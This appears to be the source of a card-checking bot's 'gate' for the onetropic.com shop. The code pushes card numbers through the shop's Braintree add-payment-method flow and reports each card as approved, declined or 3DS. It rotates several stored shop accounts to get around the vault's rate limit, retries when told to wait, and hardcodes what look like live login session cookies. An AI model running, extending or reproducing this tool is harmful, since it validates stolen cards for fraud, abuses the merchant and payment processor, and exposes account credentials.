"""OneTropicBT - the Braintree gate of the bot.

The flow is the one of the SkyVerge "Braintree for WooCommerce" plugin
on onetropic.com:

  1. GET /my-account/add-payment-method/  -> the wc nonce and the
     client token nonce
  2. POST /wp-admin/admin-ajax.php       -> the client token
  3. POST payments.braintree-api.com      -> the nonce of the card
  4. POST the add-payment-method form     -> the answer of the shop

The answer that is given is the answer of the shop, in its own words,
with the code of the processor beside it.
"""

import asyncio
import base64
import json
import re
import uuid
import warnings

import requests
import urllib3
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore")
urllib3.disable_warnings()

# The work is done in a thread, so the words of the answer go out as
# they are.
safe_print = print

DEBUG = False

SITE_COOKIES = {
    "sbjs_migrations": "1418474375998%3D1",
    "sbjs_current_add": "fd%3D2026-11-05%2001%3A07%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fonetropic.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29",
    "sbjs_first_add": "fd%3D2026-11-05%2001%3A07%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fonetropic.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29",
    "sbjs_current": "typ%3Dtypein%7C%7Csrc%3D%28direct%29%7C%7Cmdm%3D%28none%29%7C%7Ccmp%3D%28none%29%7C%7Ccnt%3D%28none%29%7C%7Ctrm%3D%28none%29%7C%7Cid%3D%28none%29%7C%7Cplt%3D%28none%29%7C%7Cfmt%3D%28none%29%7C%7Ctct%3D%28none%29",
    "sbjs_first": "typ%3Dtypein%7C%7Csrc%3D%28direct%29%7C%7Cmdm%3D%28none%29%7C%7Ccmp%3D%28none%29%7C%7Ccnt%3D%28none%29%7C%7Ctrm%3D%28none%29%7C%7Cid%3D%28none%29%7C%7Cplt%3D%28none%29%7C%7Cfmt%3D%28none%29%7C%7Ctct%3D%28none%29",
    "sbjs_udata": "vst%3D1%7C%7Cuip%3D%28none%29%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F156.0.0.0%20Safari%2F537.36",
    "sbjs_session": "pgs%3D4%7C%7Ccpg%3Dhttps%3A%2F%2Fonetropic.com%2Fmy-account%2F",
    "_ga_WBDLG17W0M": "GS2.1.s1793840867$o1$g1$t1793840979$j21$l0$h0",
    "_ga": "GA1.1.743549894.1793840868",
    "_fbp": "fb.1.1793841137109.227202099.AQECAQMC",
    "wfwaf-authcookie-9fc89f36fa5dbe92d30260388128b3a0": "3081%7Cother%7Cread%7C5cbf40354ef24ea7c5b814fc0824f94b1a0d5b16642ded05ebc76272d4f77da5",
    "wordpress_logged_in_5ce688b0024fda1f41c221fb5f1ab287": "officialeternalemrys%7C1795050812%7CPO8h64bYwsdSjdkXMlGg1CxzfKFSI92JViBPjOeNysn%7Ccade489de39d4ee0adafd2f6f2e85fd714ad2c693af790d09306a5292324e89f",
}

SESSION_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36")

# The vault of the shop takes one card every twenty seconds, and every
# account of the shop has its own vault.  So the accounts are used one
# after the other, and the more of them there are the more cards go
# through in a minute.
#
# The accounts that are not in here are put in a file on the machine:
# /root/hitchecker/onetropic_accounts.json
# It holds a list of the cookies of the accounts, or one set of
# cookies.  The words of the file are the cookies of one account, the
# way they are in the browser.
ACCOUNTS_FILE = "/root/hitchecker/onetropic_accounts.json"


def _the_accounts():
    """The accounts of the shop: the one that is in here, and the ones
    that were put in the file."""
    out = [SITE_COOKIES]
    try:
        with open(ACCOUNTS_FILE, encoding="utf-8") as f:
            more = json.load(f)
    except Exception:
        more = None
    if isinstance(more, dict):
        more = [more]
    for one_account in (more or []):
        if isinstance(one_account, dict) and one_account:
            out.append({str(k): str(v) for k, v in one_account.items()})
    return out


def the_accounts_count():
    """How many vaults there are to ask."""
    return len(_the_accounts())

BASE = "https://onetropic.com"
PAGE_URL = BASE + "/my-account/add-payment-method/"
AJAX_URL = BASE + "/wp-admin/admin-ajax.php"

BLOCKED_BINS = {"543930"}

_BT_CODES = {
    "approved": ("1000", True),
    "approved - updated": ("1001", True),
    "processed": ("1002", True),
    "approved for partial amount": ("1003", True),
    "no reason to decline": ("85", True),
    "duplicate card exists in the vault": ("81724", True),
    "duplicate card exists": ("81724", True),
    "card already exists": ("81724", True),
    "invalid payment method nonce": ("2083", False),
    "token has already been used": ("91564", False),
    "do not honor": ("2000", False),
    "insufficient funds": ("2001", False),
    "limit exceeded": ("2002", False),
    "cardholder's activity limit exceeded": ("2003", False),
    "expired card": ("2004", False),
    "invalid credit card number": ("2005", False),
    "invalid expiration date": ("2006", False),
    "no account": ("2007", False),
    "card account length error": ("2008", False),
    "no such issuer": ("2009", False),
    "card issuer declined cvv": ("2010", False),
    "voice authorization required": ("2011", False),
    "processor declined - possible lost card": ("2012", False),
    "processor declined - possible stolen card": ("2013", False),
    "processor declined - fraud suspected": ("2014", False),
    "transaction not allowed": ("2015", False),
    "duplicate transaction": ("2016", False),
    "processor declined": ("2038", False),
    "declined": ("2046", False),
    "invalid amount": ("2048", False),
    "card reported as lost or stolen": ("2053", False),
    "issuer or cardholder has put a restriction": ("2057", False),
    "3d secure transaction required": ("2065", False),
    "3d secure authentication failed": ("2066", False),
    "3d secure authentication required": ("2095", False),
    "avs and cvv check failed": ("2100", False),
    "processor network unavailable - try again": ("3000", False),
    "settlement declined": ("4001", False),
}


def bt_label(raw):
    """The reason of the shop, with the code of the processor."""
    text = (raw or "").strip()
    m = re.search(r"[Rr]eason\s*:\s*(.+)", text)
    reason = m.group(1).strip().rstrip(". ") if m else text.rstrip(". ")
    key = reason.lower()
    entry = _BT_CODES.get(key)
    if entry:
        return "Code: %s, %s" % (entry[0], reason)
    for tkey, val in _BT_CODES.items():
        if tkey in key or key in tkey:
            return "Code: %s, %s" % (val[0], reason)
    return reason


def gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""


def parse_card(s):
    if not isinstance(s, str):
        return None
    parts = s.strip().split("|")
    if len(parts) != 4:
        return None
    cc, mm, yy, cvv = [p.strip() for p in parts]
    if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit()):
        return None
    mm = mm.zfill(2)
    yy = yy[-2:]
    cvv = cvv[:4]
    if not (12 <= len(cc) <= 19):
        return None
    if not (1 <= int(mm) <= 12):
        return None
    if not (3 <= len(cvv) <= 4):
        return None
    return cc, mm, yy, cvv


def detect_card_type(cc):
    if re.match(r"^4", cc):
        return "visa"
    if re.match(r"^(5[1-5]|2[2-7])", cc):
        return "master-card"
    if re.match(r"^3[47]", cc):
        return "american-express"
    if re.match(r"^(6011|622|64[4-9]|65)", cc):
        return "discover"
    if re.match(r"^(36|38|30[0-5])", cc):
        return "diners-club"
    if re.match(r"^35", cc):
        return "jcb"
    if re.match(r"^(6304|6759|676770|676774)", cc):
        return "maestro"
    return "visa"


def decode_client_token(raw):
    try:
        padded = raw.replace("-", "+").replace("_", "/")
        padded += "=" * (4 - len(padded) % 4)
        return json.loads(base64.b64decode(padded).decode("utf-8"))
    except Exception:
        return {}


def make_session():
    s = requests.Session()
    s.verify = False
    s.trust_env = False
    s.headers.update({"Accept-Encoding": "gzip, deflate",
                       "Connection": "keep-alive"})
    return s


def check_card(line, account=0):
    """The card is put into the checkout of the shop, and the answer of
    the shop is given as it said it."""
    res = parse_card(line)
    if not res:
        return "ERROR: invalid card format (use CCN|MM|YY|CVV)"
    cc, mm, yy, cvv = res
    bin6 = cc[:6]
    if bin6 in BLOCKED_BINS:
        return "BLOCKED: BIN Blocked For API Security (%s)" % bin6
    card_type = detect_card_type(cc)
    sess = make_session()
    _accounts = _the_accounts()
    auth_cookies = _accounts[account % len(_accounts)].copy()
    session_id = str(uuid.uuid4())
    correlation = str(uuid.uuid4())

    try:
        r1 = sess.get(
            PAGE_URL, cookies=auth_cookies,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": BASE + "/my-account/payment-methods/",
                "User-Agent": SESSION_UA,
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }, timeout=25)
    except Exception as e:
        return "ERROR: page GET failed - %s" % e

    for ck in r1.cookies:
        auth_cookies[ck.name] = ck.value
    if "login" in r1.url and "add-payment-method" not in r1.url:
        return "ERROR: SESSION INVALID - log in to onetropic.com and refresh SITE_COOKIES"
    page_html = r1.text

    wc_nonce = ""
    m = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', page_html)
    if m:
        wc_nonce = m.group(1)
    if not wc_nonce:
        wc_nonce = gstr(page_html, 'name="woocommerce-add-payment-method-nonce" value="', '"')
    if not wc_nonce:
        return "ERROR: SESSION INVALID - wc_nonce not found (re-login + refresh cookies)"

    ct_nonce = ""
    m2 = re.search(
        r'"id"\s*:\s*"braintree_credit_card"[^}]{0,400}"client_token_nonce"\s*:\s*"([a-f0-9]{8,12})"',
        page_html)
    if m2:
        ct_nonce = m2.group(1)
    if not ct_nonce:
        all_nonces = re.findall(r'"client_token_nonce"\s*:\s*"([a-f0-9]{8,12})"', page_html)
        ct_nonce = all_nonces[-1] if all_nonces else ""
    if not ct_nonce:
        return "ERROR: SESSION INVALID - client_token_nonce not found in page"

    try:
        r2 = sess.post(
            AJAX_URL, cookies=auth_cookies,
            headers={
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": BASE, "Referer": PAGE_URL, "User-Agent": SESSION_UA,
                "Cache-Control": "no-cache", "Pragma": "no-cache",
            },
            data={"action": "wc_braintree_credit_card_get_client_token",
                   "nonce": ct_nonce},
            timeout=20)
    except Exception as e:
        return "ERROR: client token AJAX failed - %s" % e

    raw_body = r2.text.strip()
    if r2.status_code in (400, 403) or raw_body in ("-1", "0", ""):
        return ("ERROR: SESSION INVALID - WordPress rejected the nonce. "
                "Log back into onetropic.com/my-account/, re-export the "
                "cookies and update SITE_COOKIES.")
    try:
        ajax_body = r2.json()
    except Exception:
        return "ERROR: client token AJAX non-JSON (%s): %s" % (r2.status_code, raw_body[:200])
    if not isinstance(ajax_body, dict) or not ajax_body.get("success"):
        return "ERROR: client token AJAX failed - %s" % ajax_body
    raw_token = ajax_body.get("data", "")
    if not raw_token:
        return "ERROR: client token AJAX returned empty data"
    token_json = decode_client_token(raw_token)
    fingerprint = token_json.get("authorizationFingerprint", "")
    if not fingerprint:
        return "ERROR: no authorizationFingerprint in client token"

    try:
        r3 = sess.post(
            "https://payments.braintree-api.com/graphql",
            headers={
                "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9",
                "Authorization": "Bearer %s" % fingerprint,
                "Braintree-Version": "2018-05-10",
                "Content-Type": "application/json",
                "Origin": "https://assets.braintreegateway.com",
                "Referer": "https://assets.braintreegateway.com/",
                "User-Agent": SESSION_UA,
                "Cache-Control": "no-cache", "Pragma": "no-cache",
            },
            json={
                "clientSdkMetadata": {"source": "client", "integration": "custom",
                                      "sessionId": session_id},
                "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
                          "  tokenizeCreditCard(input: $input) { token"
                          "    creditCard { bin brandCode last4 cardholderName"
                          "      expirationMonth expirationYear"
                          "      binData { prepaid healthcare debit durbinRegulated commercial"
                          "        payroll issuingBank countryOfIssuance productId } } } }"),
                "variables": {"input": {
                    "creditCard": {"number": cc, "expirationMonth": mm,
                                   "expirationYear": "20" + yy, "cvv": cvv},
                    "options": {"validate": False}}},
                "operationName": "TokenizeCreditCard",
            }, timeout=20)
    except Exception as e:
        return "ERROR: Braintree tokenize failed - %s" % e

    bt_nonce = gstr(r3.text, '"token":"', '"')
    if not bt_nonce:
        return "ERROR: tokenize returned no nonce - %s" % r3.text[:200]

    device_data = json.dumps({"correlation_id": correlation})
    post_data = [
        ("payment_method", "braintree_credit_card"),
        ("wc-braintree-credit-card-card-type", card_type),
        ("wc-braintree-credit-card-3d-secure-enabled", ""),
        ("wc-braintree-credit-card-3d-secure-verified", ""),
        ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
        ("wc_braintree_credit_card_payment_nonce", bt_nonce),
        ("wc_braintree_device_data", device_data),
        ("wc-braintree-credit-card-tokenize-payment-method", "true"),
        ("wc_braintree_paypal_payment_nonce", ""),
        ("wc_braintree_device_data", device_data),
        ("wc-braintree-paypal-context", "shortcode"),
        ("wc_braintree_paypal_amount", "0.00"),
        ("wc_braintree_paypal_currency", "EUR"),
        ("wc_braintree_paypal_locale", "en_us"),
        ("wc-braintree-paypal-tokenize-payment-method", "true"),
        ("woocommerce-add-payment-method-nonce", wc_nonce),
        ("_wp_http_referer", "/my-account/add-payment-method/"),
        ("woocommerce_add_payment_method", "1"),
    ]

    try:
        r4 = sess.post(
            PAGE_URL, cookies=auth_cookies,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": BASE, "Referer": PAGE_URL, "User-Agent": SESSION_UA,
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "no-cache", "Pragma": "no-cache",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1",
            },
            data=post_data, allow_redirects=True, timeout=25)
    except Exception as e:
        return "ERROR: form submit failed - %s" % e

    resp_html = r4.text
    if r4.url and "login" in r4.url.lower() and "add-payment-method" not in r4.url:
        return "ERROR: SESSION EXPIRED mid-run - refresh SITE_COOKIES"

    try:
        soup = BeautifulSoup(resp_html, "html.parser")
    except Exception:
        soup = None

    ok_txt = ""
    if soup:
        ok_el = soup.select_one("div.woocommerce-message, ul.woocommerce-message")
        ok_txt = ok_el.get_text(" ", strip=True).lower() if ok_el else ""
    if any(p in ok_txt for p in ["payment method successfully added",
                                "payment method added",
                                "new payment method added"]) or any(
            p in resp_html[:6000].lower() for p in [
                "payment method successfully added", "payment method added"]):
        return "APPROVED"

    err_txt = ""
    if soup:
        err_items = soup.select("ul.woocommerce-error li")
        err_txt = " | ".join(el.get_text(" ", strip=True) for el in err_items)
        if not err_txt:
            notices = soup.select_one("div.woocommerce-notices-wrapper")
            err_txt = notices.get_text(" ", strip=True) if notices else ""
    if not err_txt:
        return "ERROR: no response notice - the shop gave no word"

    combined_lower = err_txt.lower()
    if "recaptcha" in combined_lower or "captcha" in combined_lower:
        return "ERROR: CAPTCHA REQUIRED - the shop added a captcha to this page"
    if any(p in combined_lower for p in ["duplicate card exists in the vault",
                                        "duplicate card exists",
                                        "card already exists"]):
        return "APPROVED | %s" % bt_label(err_txt)
    if any(p in combined_lower for p in ["3d secure", "three_d_secure",
                                        "authentication required",
                                        "verify your card", "liability shift"]):
        return "3DS | %s" % bt_label(err_txt)
    decline_keywords = [
        "do not honor", "insufficient funds", "limit exceeded", "cardholder",
        "expired card", "invalid credit card number", "invalid expiration date",
        "no account", "no such issuer", "card issuer declined cvv",
        "voice authorization", "processor declined", "transaction not allowed",
        "invalid transaction", "security violation", "declined - call",
        "declined - not", "set up error", "encryption error", "invalid amount",
        "card reported as lost", "restriction on the card", "invalid payment",
        "no reason to decline", "there was an error adding", "reason:",
    ]
    if any(p in combined_lower for p in decline_keywords):
        return "DECLINED | %s" % bt_label(err_txt)
    return "DECLINED | %s" % err_txt[:200]


async def check_card_braintree(cc, mm=None, yy=None, cvv=None, proxy=None,
                              account=0):
    """The gate of the bot: the card is put into the shop, and the answer
    of the shop is given as it said it.

    The card comes either as four pieces or as one line, and both are
    taken.
    """
    line = str(cc or "").strip()
    # The card may come as one line, or as four pieces, or as the
    # pieces of a line that was cut up.  All of them are taken, and
    # what is wanted is a card of four pieces.
    if "|" in line:
        line = line
    elif mm is not None and yy is not None and cvv is not None:
        line = "%s|%s|%s|%s" % (cc, mm, yy, cvv)
    elif len(line) >= 4 and all(part.strip().isdigit() for part in line[:4]):
        # a line that was cut into its characters
        line = "%s|%s|%s|%s" % (line[0], line[2], line[4], line[6])

    # The vault of the shop takes one card every twenty seconds, and it
    # says so when it is asked too soon.  That is not an answer about
    # the card: the card was not looked at.  So the shop is waited for
    # and the card is asked again, and only when it keeps saying that
    # is it an error and not a refusal.
    out = ""
    for turn in range(3):
        out = await asyncio.to_thread(check_card, line, account)
        if not _the_vault_asked_to_wait(out):
            return out
        if turn < 2:
            await asyncio.sleep(21 + turn * 3)
    return ("ERROR - the vault of the shop asked to wait and the card was "
            "not looked at: %s" % str(out)[:140])


# The words of the vault when it is asked too soon.
_WAIT_WORDS = (
    "cannot add a new payment method so soon",
    "too soon after the previous",
    "please wait for 20 seconds",
    "try again in a few seconds",
    "rate limit",
)


def _the_vault_asked_to_wait(text):
    """The vault asked to wait, so the card was not looked at."""
    low = str(text or "").lower()
    return any(w in low for w in _WAIT_WORDS)


def checkx(line, proxy=None):
    result = check_card(line.strip())
    safe_print("  %s ---> %s" % (line.strip(), result))
    if result.startswith("APPROVED"):
        return True
    if result.startswith("ERROR") or result.startswith("BLOCKED"):
        return None
    return False
